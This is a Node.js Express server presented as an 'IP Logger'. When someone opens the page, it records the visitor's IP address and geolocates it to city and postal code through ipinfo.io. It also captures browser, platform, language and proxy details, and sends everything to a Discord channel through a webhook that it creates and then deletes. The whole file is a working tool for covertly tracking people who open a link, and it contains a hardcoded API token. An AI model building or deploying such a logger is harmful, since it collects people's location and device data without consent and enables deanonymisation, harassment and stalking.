const express = require('express');
const fetch = require('isomorphic-fetch');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const app = express();

const botToken = process.env.bot_token;
const channelID = process.env.channel_id;
const port = process.env.port || 3000;

async function createWebhook(channelID) {
  const url = `https://discord.com/api/v10/channels/${channelID}/webhooks`;
  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bot ${botToken}`,
    },
    body: JSON.stringify({ name: 'Logger Webhook' }),
  });
  const data = await response.json();
  return `https://discord.com/api/v10/webhooks/${data.id}/${data.token}`;
}

async function deleteWebhook(webhookUrl) {
  const urlSplit = webhookUrl.split('/');
  const webhookID = urlSplit[5];
  const webhookToken = urlSplit[6];
  const url = `https://discord.com/api/v10/webhooks/${webhookID}/${webhookToken}`;
  await fetch(url, {
    method: 'DELETE',
    headers: {
      'Authorization': `Bot ${botToken}`,
    },
  });
}

app.get('/', async (req, res) => {
  const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const response = await fetch(`https://ipinfo.io/${ipAddress}?token=2001557f8b906a`);
  const data = await response.json();
  const { region, city, country, postal } = data;
  const userAgent = req.headers['user-agent'];
  const supportedLanguages = ['en', 'nl', 'it', 'de', 'ru', 'cn', 'in', 'hk'];
  const lang = req.headers['accept-language'].split(',')[0];
  const platform = userAgent && userAgent.split('(')[1].split(')')[0];
  const browser = userAgent.split('/')[0];
  const isProxy = req.headers['via'] || req.headers['x-forwarded-for'];

  try {
    const webhookUrl = await createWebhook(channelID);
    const webhook = new Webhook(webhookUrl);

    const embed = new MessageBuilder()
      .setTitle('IP Logger')
      .setDescription('This is an IP logger made by https://github.com/baum1810')
      .addField('IP', ipAddress)
      .addField('Country', country)
      .addField('Region', region)
      .addField('City', city)
      .addField('Postal', postal)
      .addField('User Agent', userAgent)
      .addField('Browser Language', lang)
      .addField('Platform', platform)
      .addField('Browser', browser)
      .addField('Proxy/VPN', isProxy ? 'Yes' : 'No')
      .setColor('#5CDBF0')
      .setTimestamp();

    await webhook.send(embed);

    webhook.on('response', async () => {
      await deleteWebhook(webhookUrl);
      res.send('Address Logged');
    });
  } catch (error) {
    console.error(`Error handling request: ${error}`);
    res.status(500).send('Internal server error');
  }
});

app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`);
});
